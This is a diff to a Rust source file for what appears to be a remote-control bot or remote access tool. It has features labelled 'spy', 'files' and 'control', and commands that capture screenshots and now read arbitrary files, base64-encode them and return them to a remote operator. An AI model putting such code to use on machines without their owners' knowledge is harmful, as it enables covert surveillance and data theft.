@@ -27,18 +27,18 @@ use screenshots::{ Screen, image };
 #[cfg(feature = "spy")]
 use std::io::Cursor;
 #[cfg(feature = "spy")]
-use base64::encode;
-#[cfg(feature = "spy")]
 use whoami;
 #[cfg(feature = "spy")]
 use std::env;
+#[cfg(any(feature = "spy", feature = "files"))]
+use base64::encode;
 
 #[cfg(feature = "files")]
-use std::io::Read;
+use std::io::{ Read, Write };
 #[cfg(feature = "files")]
 use std::fs::File;
 #[cfg(feature = "files")]
-use std::io::Write;
+use std::path::Path;
 
 #[macro_use]
 pub mod helpers {
@@ -188,7 +188,7 @@ pub fn screenshot(_args: Args, out: OutFun) {
         match image.write_to(&mut cursor, image::ImageOutputFormat::Png) {
             Ok(_) => {
                 let base64_data = encode(&buffer);
-                text_output!(out, "Outputting screenshot");
+                text_output!(out, "Getting screenshot");
                 media_output!(out, "screenshot.png", base64_data);
             }
             Err(err) => {
@@ -334,6 +334,44 @@ pub fn upload(args: Args, out: OutFun) {
 }
 
 #[cfg(feature = "files")]
+pub fn dupload(args: Args, out: OutFun) {
+    if args.len() < 1 {
+        text_output!(out, "Please provide a file path to upload.");
+        return;
+    }
+
+    let file_path = &args[0];
+
+    let mut file = match File::open(file_path) {
+        Ok(file) => file,
+        Err(err) => {
+            text_output!(out, format!("Error opening file: {}", err));
+            return;
+        }
+    };
+    let mut buffer = vec![];
+    match file.read_to_end(&mut buffer) {
+        Ok(_) => {}
+        Err(err) => {
+            text_output!(out, format!("Error reading file: {}", err));
+            return;
+        }
+    }
+    let base64_data = encode(&buffer);
+
+    let path_obj = Path::new(file_path);
+    let file_name = match path_obj.file_name().and_then(|f| f.to_str()) {
+        Some(name) => name,
+        _ => {
+            text_output!(out, "Unable to get file name. Using generic.");
+            "generic_name.FILE"
+        }
+    };
+    text_output!(out, "Reading file success.");
+    media_output!(out, file_name, base64_data);
+}
+
+#[cfg(feature = "files")]
 pub fn ls(args: Args, out: OutFun) {
     let dir;
     if args.len() < 1 {
@@ -374,6 +412,25 @@ pub fn ls(args: Args, out: OutFun) {
     }
 }
 
+#[cfg(feature = "files")]
+pub fn pwd(_args: Args, out: OutFun) {
+    let dir = match std::env::current_dir() {
+        Ok(b) => {
+            match b.to_str() {
+                Some(s) => s.to_string(),
+                _ => {
+                    text_output!(out, format!("Couldn't convert pathbuf to string"));
+                    return;
+                }
+            }
+        }
+        Err(err) => {
+            text_output!(out, format!("Unable to get current directory {:?}", err));
+            return;
+        }
+    };
+    text_output!(out, format!("Working in {}", dir));
+}
 #[cfg(feature = "control")]
 pub fn opencmd(args: Args, out: OutFun) {
     if args.len() < 1 {
